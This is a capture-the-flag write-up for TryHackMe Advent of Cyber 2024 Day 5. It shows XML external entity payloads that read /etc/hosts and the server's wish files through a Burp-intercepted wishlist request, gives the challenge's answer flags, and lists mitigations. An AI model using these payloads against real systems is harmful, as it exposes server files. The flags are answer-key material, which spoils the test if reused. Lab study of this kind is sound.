# 🎄 TryHackMe Advent of Cyber 2024 – Day 5: XXE Exploitation Challenge

## Objectives 🎯

1. Understand how XML and entities work to identify XXE vulnerabilities.
2. Exploit the XXE vulnerability to access restricted files.
3. Investigate application development history for signs of sabotage.

## Steps 🚀

### Step 1: Identifying the XXE Vulnerability

#### Setting Up Burp Suite
1. **Install and Launch Burp Suite:**  
   - Download Burp Suite [here](https://portswigger.net/burp).
2. **Navigate to the Website:**  
   - Open Burp's browser and visit `http://MACHINE_IP/product.php`.
3. **Add a Product to Wishlist:**  
   - Intercept the "Add to Wishlist" request using Burp Suite’s **Proxy** tab.

#### Crafting the Payload
1. **Intercept and Modify the Request:**  
   Replace the `<product_id>` value in the XML with an external entity reference:
   ```
   <!--?xml version="1.0"?-->
   <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
   <wishlist>
     <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
   </wishlist>
   ```
2. **Send the Request:**  
   Use Burp’s **Repeater** tab to send the modified request and observe the response.

### Step 2: Exploiting the XXE Vulnerability

#### Accessing Sensitive Files
1. **Target Files in the Server:**  
   Modify the payload to access files in `/var/www/html/wishes/`:
   ```
   <!--?xml version="1.0"?-->
   <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
   <wishlist>
     <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
   </wishlist>
   ```
2. **Iterate Through Files:**  
   Change the file name incrementally (e.g., `wish_2.txt`, `wish_3.txt`) to uncover additional content.

#### Discovering the Flag
- On `wish_15.txt`, the response reveals:  
  ```
  PS: The flag is THM{Brut3f0rc1n6_mY_w4y}
  ```

### Step 3: Investigating the Sabotage

#### Accessing the Changelog
1. **View the Changelog:**  
   Visit `http://MACHINE_IP/CHANGELOG`.
2. **Analyze Entries:**  
   The changelog indicates a recent update introducing vulnerable XML parser code.

#### Discovering the Sabotage Flag
- The changelog reveals the sabotage:  
  **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`

## Key Findings 🔑

1. **Sensitive File Access:** Exploiting the XXE vulnerability enabled access to restricted server files.
2. **Evidence of Sabotage:** The changelog confirmed suspicious modifications by Mayor Malware.
3. **Unsecure XML Parsing:** The vulnerability arose from improperly handled external entities.

## Lessons Learned 🌟

### Understanding XXE Exploitation
1. **XML Risks:** XML parsing without restrictions can expose sensitive backend systems.
2. **Entity Resolution:** External entities can be used to access files or send malicious requests.

### Mitigation Strategies
1. **Disable External Entity Loading:**  
   - Use `libxml_disable_entity_loader(true)` in PHP.
2. **Input Validation:**  
   - Restrict XML structures and validate inputs before processing.
3. **Regular Audits:**  
   - Review and test applications for vulnerabilities prior to deployment.

### Tools and Techniques 🛠️

1. **[Burp Suite](https://portswigger.net/burp):** Intercepted and modified HTTP requests to test for XXE.  
2. **XML Payloads:** Exploited vulnerabilities using custom XML with external entities.  
3. **Browser:** Accessed the application and verified the exploitation outcomes.

## Final Thoughts 🎁

Day 5 emphasized the importance of secure coding practices when dealing with XML. The challenge demonstrated how improper parsing could expose sensitive data and highlighted the dangers of external entities. Understanding these risks and addressing them proactively is crucial for secure application development.

### Answers ✅

1. **What is the flag discovered after navigating through the wishes?**  
   **Answer:** `THM{Brut3f0rc1n6_mY_w4y}`  
2. **What is the flag seen on the possible proof of sabotage?**  
   **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`  

## Table of Contents 📚

| Day  | Challenge                              | Day  | Challenge                               | Day  | Challenge                               |
|------|----------------------------------------|------|-----------------------------------------|------|-----------------------------------------|
| 📖  | [README](README.md)                    | 11   | [Wi-Fi Attacks](day_11.md)             | 22   | [Kubernetes DFIR](day_22.md)            |
| 1    | [OPSEC Challenge](day1.md)             | 12   | [Web Timing Attacks](day_12.md)        | 23   | [Hash Cracking](day_23.md)              |
| 2    | [Log Analysis](day2.md)                | 13   | [WebSockets](day_13.md)                | 24   | [Hash Cracking](day_23.md)              |
| 3    | [Log Analysis](day3.md)                | 14   | [Certificate Mismanagement](day_14.md) | 25   |                                         |
| 4    | [Atomic Red Team](day4.md)             | 15   | [Active Directory](day_15.md)          | 26   |                                         |
| 5    | **XXE]**                               | 16   | [Azure Exploitation](day_16.md)        | 27   |                                         |
| 6    | [Sandboxes](day6.md)                   | 17   | [Log Analysis](day_17.md)              | 28   |                                         |
| 7    | [AWS Sandboxes](day7.md)               | 18   | [Prompt Injection](day_18.md)          | 29   |                                         |
| 8    | [Shellcodes](day8.md)                  | 19   | [Game Hacking](day_19.md)              | 30   |                                         |
| 9    | [Risk Assessment](day9.md)             | 20   | [Traffic Analysis](day_20.md)          | 31   |                                         |
| 10   | [Phishing](day_10.md)                  | 21   | [Reverse Engineering](day_21.md)       | ☃️  | 🎄🎅🎁✨                              |
